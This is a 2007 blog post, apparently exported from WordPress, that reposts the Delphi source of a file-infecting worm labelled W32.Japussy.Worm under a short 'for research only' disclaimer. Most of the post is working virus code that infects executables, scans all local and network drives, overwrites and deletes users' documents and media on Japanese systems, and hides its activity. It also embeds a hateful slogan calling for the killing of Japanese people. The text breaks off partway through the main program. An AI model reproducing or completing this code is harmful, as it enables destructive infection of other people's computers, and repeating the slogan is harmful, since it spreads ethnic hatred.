---
layout: post
status: publish
published: true
title: "熊猫烧香源代码"
author:
  display_name: Leask
  login: leask
  email: i@leaskh.com
  url: http://www.leaskh.com
author_login: leask
author_email: i@leaskh.com
author_url: http://www.leaskh.com
wordpress_id: 358
wordpress_url: http://leaskh.wordpress.com/2007/03/05/%e7%86%8a%e7%8c%ab%e7%83%a7%e9%a6%99%e6%ba%90%e4%bb%a3%e7%a0%81
date: '2007-03-05 04:56:18 +0800'
date_gmt: '2007-03-05 04:56:18 +0800'
categories:
- Computers and Internet
tags: []
comments: []
---
<div id="msgcns!15BAC1A170471DB!2154" class="bvMsg">声明：<br />
<br &#47;>以下代码为网上收集，本人不保证其真实性。<br />
<br &#47;>调试以下代码存在数据风险，敬请留意。<br />
<br &#47;>以下代码仅供原理分析或参考研究，禁止用于非法用途。<br />
<br &#47;>如任何人由于以下代码的发布蒙受任何损失均不为本Space责任。<br />
<br &#47;><br />
<br &#47;>Leask Huang<br />
<br &#47;>March 5, 2007<br />
<br &#47;><br />
<br &#47;><br />
<hr &#47;>
熊猫烧香源代码：<br />
<br &#47;><br />
<br &#47;>program Japussy;<br &#47;>uses<br &#47;>&nbsp; Windows, SysUtils, Classes, Graphics, ShellAPI&#123;, Registry&#125;;<br &#47;>const<br &#47;>&nbsp; HeaderSize = 82432;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;病毒体的大小<br &#47;>&nbsp; IconOffset = $12EB8;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;PE文件主图标的偏移量<br &#47;>&nbsp; <br &#47;>&nbsp; &#47;&#47;在我的Delphi5 SP1上面编译得到的大小，其它版本的Delphi可能不同<br &#47;>&nbsp; &#47;&#47;查找2800000020的十六进制字符串可以找到主图标的偏移量<br &#47;>&nbsp;&nbsp; <br &#47;>&#123;<br &#47;>&nbsp; HeaderSize = 38912;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;Upx压缩过病毒体的大小<br &#47;>&nbsp; IconOffset = $92BC;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;Upx压缩过PE文件主图标的偏移量<br &#47;>&nbsp; <br &#47;>&nbsp; &#47;&#47;Upx 1.24W 用法: upx -9 --8086 Japussy.exe<br &#47;>&#125;<br &#47;>&nbsp; IconSize&nbsp;&nbsp; = $2E8;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;PE文件主图标的大小--744字节<br &#47;>&nbsp; IconTail&nbsp;&nbsp; = IconOffset + IconSize;&nbsp; &#47;&#47;PE文件主图标的尾部<br &#47;>&nbsp; ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = $44444444;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;感染标记<br &#47;>&nbsp; <br &#47;>&nbsp; &#47;&#47;垃圾码，以备写入<br &#47;>&nbsp; Catchword = 'If a race need to be killed out, it must be Yamato. ' +<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'If a country need to be destroyed, it must be Japan! ' +<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '*** W32.Japussy.Worm.A ***';<br &#47;>&#123;$R *.RES&#125;<br &#47;>function RegisterServiceProcess(dwProcessID, dwType: Integer): Integer; <br &#47;>&nbsp; stdcall; external 'Kernel32.dll'; &#47;&#47;函数声明<br &#47;>var<br &#47;>&nbsp; TmpFile: string;<br &#47;>&nbsp; Si:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STARTUPINFO;<br &#47;>&nbsp; Pi:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PROCESS_INFORMATION;<br &#47;>&nbsp; IsJap:&nbsp;&nbsp; Boolean = False; &#47;&#47;日文操作系统标记<br &#47;>&#123; 判断是否为Win9x &#125;<br &#47;>function IsWin9x: Boolean;<br &#47;>var<br &#47;>&nbsp; Ver: TOSVersionInfo;<br &#47;>begin<br &#47;>&nbsp; Result := False;<br &#47;>&nbsp; Ver.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);<br &#47;>&nbsp; if not GetVersionEx(Ver) then<br &#47;>&nbsp;&nbsp;&nbsp; Exit;<br &#47;>&nbsp; if (Ver.dwPlatformID = VER_PLATFORM_WIN32_WINDOWS) then &#47;&#47;Win9x<br &#47;>&nbsp;&nbsp;&nbsp; Result := True;<br &#47;>end;<br &#47;>&#123; 在流之间复制 &#125;<br &#47;>procedure CopyStream(Src: TStream; sStartPos: Integer; Dst: TStream;<br &#47;>&nbsp; dStartPos: Integer; Count: Integer);<br &#47;>var<br &#47;>&nbsp; sCurPos, dCurPos: Integer;<br &#47;>begin<br &#47;>&nbsp; sCurPos := Src.Position;<br &#47;>&nbsp; dCurPos := Dst.Position;<br &#47;>&nbsp; Src.Seek(sStartPos, 0);<br &#47;>&nbsp; Dst.Seek(dStartPos, 0);<br &#47;>&nbsp; Dst.CopyFrom(Src, Count);<br &#47;>&nbsp; Src.Seek(sCurPos, 0);<br &#47;>&nbsp; Dst.Seek(dCurPos, 0);<br &#47;>end;<br &#47;>&#123; 将宿主文件从已感染的PE文件中分离出来，以备使用 &#125;<br &#47;>procedure ExtractFile(FileName: string);<br &#47;>var<br &#47;>&nbsp; sStream, dStream: TFileStream;<br &#47;>begin<br &#47;>&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp; sStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);<br &#47;>&nbsp;&nbsp;&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dStream := TFileStream.Create(FileName, fmCreate);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sStream.Seek(HeaderSize, 0); &#47;&#47;跳过头部的病毒部分<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dStream.CopyFrom(sStream, sStream.Size - HeaderSize);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finally<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dStream.Free;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp; finally<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sStream.Free;<br &#47;>&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp; except<br &#47;>&nbsp; end;<br &#47;>end;<br &#47;>&#123; 填充STARTUPINFO结构 &#125;<br &#47;>procedure FillStartupInfo(var Si: STARTUPINFO; State: Word);<br &#47;>begin<br &#47;>&nbsp; Si.cb := SizeOf(Si);<br &#47;>&nbsp; Si.lpReserved := nil;<br &#47;>&nbsp; Si.lpDesktop := nil;<br &#47;>&nbsp; Si.lpTitle := nil;<br &#47;>&nbsp; Si.dwFlags := STARTF_USESHOWWINDOW;<br &#47;>&nbsp; Si.wShowWindow := State;<br &#47;>&nbsp; Si.cbReserved2 := 0;<br &#47;>&nbsp; Si.lpReserved2 := nil;<br &#47;>end;<br &#47;>&#123; 发带毒邮件 &#125;<br &#47;>procedure SendMail;<br &#47;>begin<br &#47;>&nbsp; &#47;&#47;哪位仁兄愿意完成之？<br &#47;>end;<br &#47;>&#123; 感染PE文件 &#125;<br &#47;>procedure InfectOneFile(FileName: string);<br &#47;>var<br &#47;>&nbsp; HdrStream, SrcStream: TFileStream;<br &#47;>&nbsp; IcoStream, DstStream: TMemoryStream;<br &#47;>&nbsp; iID: LongInt;<br &#47;>&nbsp; aIcon: TIcon;<br &#47;>&nbsp; Infected, IsPE: Boolean;<br &#47;>&nbsp; i: Integer;<br &#47;>&nbsp; Buf: array[0..1] of Char;<br &#47;>begin<br &#47;>&nbsp; try &#47;&#47;出错则文件正在被使用，退出<br &#47;>&nbsp;&nbsp;&nbsp; if CompareText(FileName, 'JAPUSSY.EXE') = 0 then &#47;&#47;是自己则不感染<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exit;<br &#47;>&nbsp;&nbsp;&nbsp; Infected := False;<br &#47;>&nbsp;&nbsp;&nbsp; IsPE&nbsp;&nbsp;&nbsp;&nbsp; := False;<br &#47;>&nbsp;&nbsp;&nbsp; SrcStream := TFileStream.Create(FileName, fmOpenRead);<br &#47;>&nbsp;&nbsp;&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for i := 0 to $108 do &#47;&#47;检查PE文件头<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Seek(i, soFromBeginning);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Read(Buf, 2);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (Buf[0] = #80) and (Buf[1] = #69) then &#47;&#47;PE标记<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IsPE := True; &#47;&#47;是PE文件<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Break;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Seek(-4, soFromEnd); &#47;&#47;检查感染标记<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Read(iID, 4);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (iID = ID) or (SrcStream.Size < 10240) then &#47;&#47;太小的文件不感染<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Infected := True;<br &#47;>&nbsp;&nbsp;&nbsp; finally<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Free;<br &#47;>&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp; if Infected or (not IsPE) then &#47;&#47;如果感染过了或不是PE文件则退出<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exit;<br &#47;>&nbsp;&nbsp;&nbsp; IcoStream := TMemoryStream.Create;<br &#47;>&nbsp;&nbsp;&nbsp; DstStream := TMemoryStream.Create;<br &#47;>&nbsp;&nbsp;&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon := TIcon.Create;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;得到被感染文件的主图标(744字节)，存入流<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon.ReleaseHandle;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon.Handle := ExtractIcon(HInstance, PChar(FileName), 0);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon.SaveToStream(IcoStream);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finally<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aIcon.Free;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream := TFileStream.Create(FileName, fmOpenRead);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;头文件<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HdrStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;写入病毒体主图标之前的数据<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CopyStream(HdrStream, 0, DstStream, 0, IconOffset);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;写入目前程序的主图标<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CopyStream(IcoStream, 22, DstStream, IconOffset, IconSize);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;写入病毒体主图标到病毒体尾部之间的数据<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CopyStream(HdrStream, IconTail, DstStream, IconTail, HeaderSize - IconTail);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;写入宿主程序<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CopyStream(SrcStream, 0, DstStream, HeaderSize, SrcStream.Size);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;写入已感染的标记<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DstStream.Seek(0, 2);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iID := $44444444;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DstStream.Write(iID, 4);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; finally<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; HdrStream.Free;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp; finally<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SrcStream.Free;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IcoStream.Free;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DstStream.SaveToFile(FileName); &#47;&#47;替换宿主文件<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DstStream.Free;<br &#47;>&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp; except;<br &#47;>&nbsp; end;<br &#47;>end;<br &#47;><br &#47;>&#123; 将目标文件写入垃圾码后删除 &#125;<br &#47;>procedure SmashFile(FileName: string);<br &#47;>var<br &#47;>&nbsp; FileHandle: Integer;<br &#47;>&nbsp; i, Size, Mass, Max, Len: Integer;<br &#47;>begin<br &#47;>&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp; SetFileAttributes(PChar(FileName), 0); &#47;&#47;去掉只读属性<br &#47;>&nbsp;&nbsp;&nbsp; FileHandle := FileOpen(FileName, fmOpenWrite); &#47;&#47;打开文件<br &#47;>&nbsp;&nbsp;&nbsp; try<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Size := GetFileSize(FileHandle, nil); &#47;&#47;文件大小<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i := 0;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Randomize;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Max := Random(15); &#47;&#47;写入垃圾码的随机次数<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if Max < 5 then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Max := 5;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Mass := Size div Max; &#47;&#47;每个间隔块的大小<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Len := Length(Catchword);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while i < Max do<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileSeek(FileHandle, i * Mass, 0); &#47;&#47;定位<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;写入垃圾码，将文件彻底破坏掉<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileWrite(FileHandle, Catchword, Len);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Inc(i);<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp; finally<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileClose(FileHandle); &#47;&#47;关闭文件<br &#47;>&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp; DeleteFile(PChar(FileName)); &#47;&#47;删除之<br &#47;>&nbsp; except<br &#47;>&nbsp; end;<br &#47;>end;<br &#47;>&#123; 获得可写的驱动器列<br />
表 &#125;<br &#47;>function GetDrives: string;<br &#47;>var<br &#47;>&nbsp; DiskType: Word;<br &#47;>&nbsp; D: Char;<br &#47;>&nbsp; Str: string;<br &#47;>&nbsp; i: Integer;<br &#47;>begin<br &#47;>&nbsp; for i := 0 to 25 do &#47;&#47;遍历26个字母<br &#47;>&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp; D := Chr(i + 65);<br &#47;>&nbsp;&nbsp;&nbsp; Str := D + ':';<br &#47;>&nbsp;&nbsp;&nbsp; DiskType := GetDriveType(PChar(Str));<br &#47;>&nbsp;&nbsp;&nbsp; &#47;&#47;得到本地磁盘和网络盘<br &#47;>&nbsp;&nbsp;&nbsp; if (DiskType = DRIVE_FIXED) or (DiskType = DRIVE_REMOTE) then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Result := Result + D;<br &#47;>&nbsp; end;<br &#47;>end;<br &#47;>&#123; 遍历目录，感染和摧毁文件 &#125;<br &#47;>procedure LoopFiles(Path, Mask: string);<br &#47;>var<br &#47;>&nbsp; i, Count: Integer;<br &#47;>&nbsp; Fn, Ext: string;<br &#47;>&nbsp; SubDir: TStrings;<br &#47;>&nbsp; SearchRec: TSearchRec;<br &#47;>&nbsp; Msg: TMsg;<br &#47;>&nbsp; function IsValidDir(SearchRec: TSearchRec): Integer;<br &#47;>&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp; if (SearchRec.Attr <> 16) and&nbsp; (SearchRec.Name <> '.') and<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SearchRec.Name <> '..') then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Result := 0 &#47;&#47;不是目录<br &#47;>&nbsp;&nbsp;&nbsp; else if (SearchRec.Attr = 16) and&nbsp; (SearchRec.Name <> '.') and<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SearchRec.Name <> '..') then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Result := 1 &#47;&#47;不是根目录<br &#47;>&nbsp;&nbsp;&nbsp; else Result := 2; &#47;&#47;是根目录<br &#47;>&nbsp; end;<br &#47;>begin<br &#47;>&nbsp; if (FindFirst(Path + Mask, faAnyFile, SearchRec) = 0) then<br &#47;>&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp; repeat<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PeekMessage(Msg, 0, 0, 0, PM_REMOVE); &#47;&#47;调整消息队列，避免引起怀疑<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if IsValidDir(SearchRec) = 0 then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fn := Path + SearchRec.Name;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ext := UpperCase(ExtractFileExt(Fn));<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (Ext = '.EXE') or (Ext = '.SCR') then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InfectOneFile(Fn); &#47;&#47;感染可执行文件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (Ext = '.HTM') or (Ext = '.HTML') or (Ext = '.ASP') then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;感染HTML和ASP文件，将Base64编码后的病毒写入<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;感染浏览此网页的所有用户<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;哪位大兄弟愿意完成之？<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if Ext = '.WAB' then &#47;&#47;Outlook地址簿文件<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;获取Outlook邮件地址<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if Ext = '.ADC' then &#47;&#47;Foxmail地址自动完成文件<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;获取Foxmail邮件地址<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if Ext = 'IND' then &#47;&#47;Foxmail地址簿文件<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;获取Foxmail邮件地址<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else <br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if IsJap then &#47;&#47;是倭文操作系统<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (Ext = '.DOC') or (Ext = '.XLS') or (Ext = '.MDB') or<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.MP3') or (Ext = '.RM') or (Ext = '.RA') or<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.WMA') or (Ext = '.ZIP') or (Ext = '.RAR') or<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.MPEG') or (Ext = '.ASF') or (Ext = '.JPG') or<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.JPEG') or (Ext = '.GIF') or (Ext = '.SWF') or<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Ext = '.PDF') or (Ext = '.CHM') or (Ext = '.AVI') then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SmashFile(Fn); &#47;&#47;摧毁文件<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#47;&#47;感染或删除一个文件后睡眠200毫秒，避免CPU占用率过高引起怀疑<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sleep(200);<br &#47;>&nbsp;&nbsp;&nbsp; until (FindNext(SearchRec) <> 0);<br &#47;>&nbsp; end;<br &#47;>&nbsp; FindClose(SearchRec);<br &#47;>&nbsp; SubDir := TStringList.Create;<br &#47;>&nbsp; if (FindFirst(Path + '*.*', faDirectory, SearchRec) = 0) then<br &#47;>&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp; repeat<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if IsValidDir(SearchRec) = 1 then<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SubDir.Add(SearchRec.Name);<br &#47;>&nbsp;&nbsp;&nbsp; until (FindNext(SearchRec) <> 0);<br &#47;>&nbsp;&nbsp;&nbsp; end;<br &#47;>&nbsp; FindClose(SearchRec);<br &#47;>&nbsp; Count := SubDir.Count - 1;<br &#47;>&nbsp; for i := 0 to Count do<br &#47;>&nbsp;&nbsp;&nbsp; LoopFiles(Path + SubDir.Strings + '', Mask);<br &#47;>&nbsp; FreeAndNil(SubDir);<br &#47;>end;<br &#47;>&#123; 遍历磁盘上所有的文件 &#125;<br &#47;>procedure InfectFiles;<br &#47;>var<br &#47;>&nbsp; DriverList: string;<br &#47;>&nbsp; i, Len: Integer;<br &#47;>begin<br &#47;>&nbsp; if GetACP = 932 then &#47;&#47;日文操作系统<br &#47;>&nbsp;&nbsp;&nbsp; IsJap := True; &#47;&#47;去死吧！<br &#47;>&nbsp; DriverList := GetDrives; &#47;&#47;得到可写的磁盘列表<br &#47;>&nbsp; Len := Length(DriverList);<br &#47;>&nbsp; while True do &#47;&#47;死循环<br &#47;>&nbsp; begin<br &#47;>&nbsp;&nbsp;&nbsp; for i := Len downto 1 do &#47;&#47;遍历每个磁盘驱动器<br &#47;>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LoopFiles(DriverList + ':', '*.*'); &#47;&#47;感染之<br &#47;>&nbsp;&nbsp;&nbsp; SendMail; &#47;&#47;发带毒邮件<br &#47;>&nbsp;&nbsp;&nbsp; Sleep(1000 * 60 * 5); &#47;&#47;睡眠5分钟<br &#47;>&nbsp; end;<br &#47;>end;<br &#47;>&#123; 主程序开始 &#125;<br &#47;>begin<br &#47;>&nbsp; if IsWin9x then &#47;&#47;是Win9x<br &#47;>&nbsp;&nbsp;&nbsp; RegisterServiceProcess(GetCurrentProcessID, 1) 